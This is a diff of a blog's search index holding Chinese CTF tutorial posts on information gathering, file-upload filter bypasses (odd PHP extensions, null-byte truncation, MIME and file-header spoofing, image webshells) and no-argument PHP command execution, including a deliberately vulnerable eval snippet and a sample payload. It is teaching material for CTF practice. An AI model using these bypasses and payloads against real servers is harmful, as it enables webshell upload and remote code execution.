+    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
 ]]></content>
       <categories>
-        <category>PHP</category>
+        <category>WEB</category>
       </categories>
       <tags>
-        <tag>区别</tag>
+        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
@@ -388,15 +415,44 @@
       </tags>
   </entry>
   <entry>
-    <title>信息收集（CTF基础篇）</title>
-    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
-    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
+    <title>文件上传</title>
+    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
+<h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>&emsp;&emsp;对于前端的概念就是我们能看到的源码的那种，我们可以打开F12或者ctrl+U找js代码，原理就是前端是客户端还没有向服务器发送任何消息时对<font color=red>本地</font>进行检测来判断是否满足上传的类型。<br>&emsp;&emsp;绕过方法</p>
+<ul>
+<li>删除或者禁用js(JavaScript) 各个浏览器有不同的方式</li>
+<li>使用代理上传文件，用BP抓包修改成符合要求的文件类型，使用方法转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
+</ul>
+<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><p>&emsp;&emsp;这种的就不能靠抓包提前去改了，主要是通过黑白名单进行过滤检测。</p>
+<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><h5 id="解析漏洞（黑名单通用）"><a href="#解析漏洞（黑名单通用）" class="headerlink" title="解析漏洞（黑名单通用）"></a>解析漏洞（黑名单通用）</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccess文件解析漏洞   <span class="comment">//重点常考点（有没有老师划重点的那味了- ̗̀(๑ᵔ⌔ᵔ๑)）</span></span><br><span class="line">apache解析漏洞</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginx的解析漏洞</span></span><br><span class="line">IIS6.<span class="number">0</span>解析漏洞</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;关于这些解析漏洞我就不细讲了，对照相应的搜索一下就可以了，这些漏洞后续也会在对应板块出现。</p>
+<h5 id="截断上传（黑名单通用）"><a href="#截断上传（黑名单通用）" class="headerlink" title="截断上传（黑名单通用）"></a>截断上传（黑名单通用）</h5><ul>
+<li>截断类型:PHP%00截断 (扩展想想还有哪个函数也是这样的)，例如1.php%00</li>
+<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断,同理，黑名单也可以用，不过我用得少</li>
+<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
+</ul>
+<h4 id="改后缀"><a href="#改后缀" class="headerlink" title="改后缀"></a>改后缀</h4><p>&emsp;&emsp;将php木马改成满足条件的后缀即可，例如<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><h5 id="特殊的扩展名"><a href="#特殊的扩展名" class="headerlink" title="特殊的扩展名"></a>特殊的扩展名</h5><p>&emsp;&emsp;如果是黑名单的就可以钻空子，看有没有漏网之鱼，例如</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">比如:</span></span><br><span class="line">asa和cer之类</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (划重点)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用windows的命名机制"><a href="#利用windows的命名机制" class="headerlink" title="利用windows的命名机制"></a>利用windows的命名机制</h5><p>&emsp;&emsp;在windows中，后缀名后面的点和空格都会被删除掉。例如</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.   <span class="built_in">shell</span>.php空格   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg   <span class="built_in">shell</span>. php::$DATA   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
+
+<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>&emsp;&emsp;有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。SQL注入同理，，例如:phphpp</p>
+<h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>&emsp;&emsp;后缀名本质上是不区分大小写滴，例如pHp，但后端检测的时候就说不准了，同理呢，SQL语句过滤也是这样的道理。要举一反三噢ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
+<h4 id="MIME检测"><a href="#MIME检测" class="headerlink" title="MIME检测"></a>MIME检测</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。用你的BP打开，类似于这些:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain （纯文本）</span><br><span class="line">text/html （HTML文档）</span><br><span class="line">text/javascript （js代码）</span><br><span class="line">application/xhtml+xml （XHTML文档）</span><br><span class="line">image/gif （GIF图像）</span><br><span class="line">image/jpeg （JPEG图像）</span><br><span class="line">image/png （PNG图像）</span><br><span class="line">video/mpeg （MPEG动画）</span><br><span class="line">application/octet-stream （二进制数据）</span><br><span class="line">application/pdf （PDF文档）</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;检测方式：在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。绕过方法我们就只要将<font color=red>content-type</font>字段改为常见的允许放行的图片类型,例如<font color=blue>image&#x2F;gif</font>,从而绕过校验。</p>
+<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>&emsp;&emsp;我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。比如<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIF木马"></p>
+<h4 id="内容检测图片马绕过"><a href="#内容检测图片马绕过" class="headerlink" title="内容检测图片马绕过"></a>内容检测图片马绕过</h4><p>&emsp;&emsp;将一句话木马插入到一个合法的图片文件当中，然后用webshell管理工具(蚁剑)连接，当然这边建议你先用phpinfo试一下，一方面有的时候flag就在里面，另一方面能验证是否上传成功。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">图片马</a></p>
+<h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>&emsp;&emsp;这个就很高深了，需要熟练使用BP，入门建议先别看。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">条件竞争</a></p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;文件上传目前常用的就几种，主要我也只会这几种，重点在于多做做题目，推荐题库：<a href="https://www.nssctf.cn/problem">NSSCTF</a>，<a href="https://buuoj.cn/">BUUCTF</a>，<a href="https://ctf.bugku.com/">BugkuCTF</a>,光上面几个就够你试的了，不详细的地方再去搜索一下，要是后续遇到新的方法我也会实时更新的。</p>
 ]]></content>
       <categories>
-        <category>WEB</category>
+        <category>PHP</category>
       </categories>
       <tags>
-        <tag>基础</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -433,6 +489,8 @@
 <h4 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h4><p>&emsp;&emsp;将前面命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；是不是看起来有点生涩？没关系，看个例题就明白了。<br>&emsp;&emsp;<font color=blue>echo “ls -l”</font>这个是只显示”ls -l”,而不是命令。<br>&emsp;&emsp;<font color=red>echo “ls -l” | &#x2F;bin&#x2F;bash</font>这个是&#x2F;bin&#x2F;bash把”ls -l”当成参数执行，也就是执行了ls -l这条命令。  </p>
 <h4 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h4><p>&emsp;&emsp;继承了逻辑或的语法，还有短路原则，换个更容易理解的就是相当于if else语句，若前面的命令执行成功，后面的命令就不会执行，反之执行后面的命令；例如<br>&emsp;&emsp;<font color=blue>ls || &gt;dev&#x2F;null 2&gt;&amp;1</font>后者相当于一个垃圾桶，你的所有输出都会被丢进去,”&gt;”代表的是重定向，还有2和1具体代表什么感兴趣的可以再去看一下，目前只要知道这样的格式代表的是垃圾桶就好。好，回归正题，如果没有||，作为顺序输出的话，就不会有回显；反之，ls正常输出，后面就不会执行了。</p>
 <h4 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h4><p>&emsp;&emsp;通俗来说就是函数里面没有有参数，比如phpinfo()是不是，里面没有参数照样能用，那么一些能利用的函数有哪些呢？？？</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="built_in">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>])<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;像是正则里面的那两个就代表过滤了参数，就只能使用无参了。</p>
 <h5 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h5><p>&emsp;&emsp;返回所有已定义的<font color=yellow>变量的值</font>,然后对应成数组（注：如果有多个请求方法，返回数组的顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES），例如：定义了<font color=pink>cmd&#x3D;system(“ls”);</font>那么执行<font color=black>print_r(get_defined_vars());</font>时，将会回显<font color=red>[cmd]&#x3D;&gt;system(“ls);</font>这是我们就可以用<font color=green>pos来提取出参数里面的值system(“ls”)</font>,什么，你说没有变量怎么办？笨蛋，不知道自己编一个吗？我们可以这样</p>
 <figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?code=print_r(<span class="keyword">end</span>(pos(get_defined_vars())));<span class="variable">&amp;cmd</span>=<span class="meta">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;注意只要后面的那个变量，用end提取(别问，问就是code我们也算变量啵，定义了两个变量就有两个数组，我们用后面那个cmd的)，这样就可以输出system(“ls”);同理，我们只要把print_r换成eval,assert就可以执行命令了，所以payload通常是:</p>
@@ -535,47 +593,6 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
-<h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>&emsp;&emsp;对于前端的概念就是我们能看到的源码的那种，我们可以打开F12或者ctrl+U找js代码，原理就是前端是客户端还没有向服务器发送任何消息时对<font color=red>本地</font>进行检测来判断是否满足上传的类型。<br>&emsp;&emsp;绕过方法</p>
-<ul>
-<li>删除或者禁用js(JavaScript) 各个浏览器有不同的方式</li>
-<li>使用代理上传文件，用BP抓包修改成符合要求的文件类型，使用方法转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
-</ul>
-<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><p>&emsp;&emsp;这种的就不能靠抓包提前去改了，主要是通过黑白名单进行过滤检测。</p>
-<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><h5 id="解析漏洞（黑名单通用）"><a href="#解析漏洞（黑名单通用）" class="headerlink" title="解析漏洞（黑名单通用）"></a>解析漏洞（黑名单通用）</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccess文件解析漏洞   <span class="comment">//重点常考点（有没有老师划重点的那味了- ̗̀(๑ᵔ⌔ᵔ๑)）</span></span><br><span class="line">apache解析漏洞</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginx的解析漏洞</span></span><br><span class="line">IIS6.<span class="number">0</span>解析漏洞</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;关于这些解析漏洞我就不细讲了，对照相应的搜索一下就可以了，这些漏洞后续也会在对应板块出现。</p>
-<h5 id="截断上传（黑名单通用）"><a href="#截断上传（黑名单通用）" class="headerlink" title="截断上传（黑名单通用）"></a>截断上传（黑名单通用）</h5><ul>
-<li>截断类型:PHP%00截断 (扩展想想还有哪个函数也是这样的)，例如1.php%00</li>
-<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断,同理，黑名单也可以用，不过我用得少</li>
-<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
-</ul>
-<h4 id="改后缀"><a href="#改后缀" class="headerlink" title="改后缀"></a>改后缀</h4><p>&emsp;&emsp;将php木马改成满足条件的后缀即可，例如<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
-<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><h5 id="特殊的扩展名"><a href="#特殊的扩展名" class="headerlink" title="特殊的扩展名"></a>特殊的扩展名</h5><p>&emsp;&emsp;如果是黑名单的就可以钻空子，看有没有漏网之鱼，例如</p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">比如:</span></span><br><span class="line">asa和cer之类</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (划重点)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="利用windows的命名机制"><a href="#利用windows的命名机制" class="headerlink" title="利用windows的命名机制"></a>利用windows的命名机制</h5><p>&emsp;&emsp;在windows中，后缀名后面的点和空格都会被删除掉。例如</p>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.   <span class="built_in">shell</span>.php空格   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg   <span class="built_in">shell</span>. php::$DATA   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
-
-<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>&emsp;&emsp;有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。SQL注入同理，，例如:phphpp</p>
-<h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>&emsp;&emsp;后缀名本质上是不区分大小写滴，例如pHp，但后端检测的时候就说不准了，同理呢，SQL语句过滤也是这样的道理。要举一反三噢ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
-<h4 id="MIME检测"><a href="#MIME检测" class="headerlink" title="MIME检测"></a>MIME检测</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。用你的BP打开，类似于这些:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain （纯文本）</span><br><span class="line">text/html （HTML文档）</span><br><span class="line">text/javascript （js代码）</span><br><span class="line">application/xhtml+xml （XHTML文档）</span><br><span class="line">image/gif （GIF图像）</span><br><span class="line">image/jpeg （JPEG图像）</span><br><span class="line">image/png （PNG图像）</span><br><span class="line">video/mpeg （MPEG动画）</span><br><span class="line">application/octet-stream （二进制数据）</span><br><span class="line">application/pdf （PDF文档）</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;检测方式：在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。绕过方法我们就只要将<font color=red>content-type</font>字段改为常见的允许放行的图片类型,例如<font color=blue>image&#x2F;gif</font>,从而绕过校验。</p>
-<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>&emsp;&emsp;我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。比如<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIF木马"></p>
-<h4 id="内容检测图片马绕过"><a href="#内容检测图片马绕过" class="headerlink" title="内容检测图片马绕过"></a>内容检测图片马绕过</h4><p>&emsp;&emsp;将一句话木马插入到一个合法的图片文件当中，然后用webshell管理工具(蚁剑)连接，当然这边建议你先用phpinfo试一下，一方面有的时候flag就在里面，另一方面能验证是否上传成功。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">图片马</a></p>
-<h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>&emsp;&emsp;这个就很高深了，需要熟练使用BP，入门建议先别看。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">条件竞争</a></p>
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;文件上传目前常用的就几种，主要我也只会这几种，重点在于多做做题目，推荐题库：<a href="https://www.nssctf.cn/problem">NSSCTF</a>，<a href="https://buuoj.cn/">BUUCTF</a>，<a href="https://ctf.bugku.com/">BugkuCTF</a>,光上面几个就够你试的了，不详细的地方再去搜索一下，要是后续遇到新的方法我也会实时更新的。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
       </tags>
   </entry>
 </search>
